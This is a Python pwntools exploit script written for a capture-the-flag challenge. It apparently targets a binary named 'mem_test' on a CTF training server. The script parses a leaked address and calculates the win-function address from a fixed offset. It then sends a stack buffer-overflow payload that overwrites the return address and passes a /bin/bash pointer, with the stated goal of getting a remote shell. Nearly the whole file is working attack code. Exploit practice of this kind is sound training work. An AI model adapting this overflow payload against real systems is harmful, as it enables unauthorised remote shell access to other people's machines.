from pwn import *

# NOTES:
# . NX Enabled
# . attack the stack
# GOAL: remote shell

# regular return address: 0x8048860

# we need to use the hint address, push to the stack and return to the win function


# win func address: 0x08048866  - static address
# hint address: 0x8048980
# NOTE: no need to compute it, PIE is off!
# now we need to calculate the offset:
# OFFSET: 0x8048980 - 0x08048866 (=282)

local=False

#context.log_level= "critical"

host, port = "ctf.hackucf.org",  9004

if local:
    sh = process('./mem_test')
else:
    sh=remote(host, port)

#attach(sh)

sh.recv()
lines = sh.recv()
rand_number, leaked_addr = lines.strip().split("\n")[:2]

rand_number
bash_addr = leaked_addr.split(":")[-1].strip()
int_bash_addr = int(bash_addr, 16)
#print bash_addr
#print p32(int(bash_addr, 16))
computed_addr = int_bash_addr - 282
win_func_addr = 0x08048866

# They are equal!
#print "computed: ", computed_addr, "debugged:", int(win_func_addr)

offset = 27 - 8 # we need to also add the string /bin/bash before returning to win func

bin_bash = p32(int_bash_addr)
print bin_bash
eip = p32(computed_addr)
#payload = "A"*offset + bin_bash + eip 
payload = "A"+"A"*offset + bin_bash + eip

sh.sendline(payload)
print payload

# when we get a shell
sh.interactive()
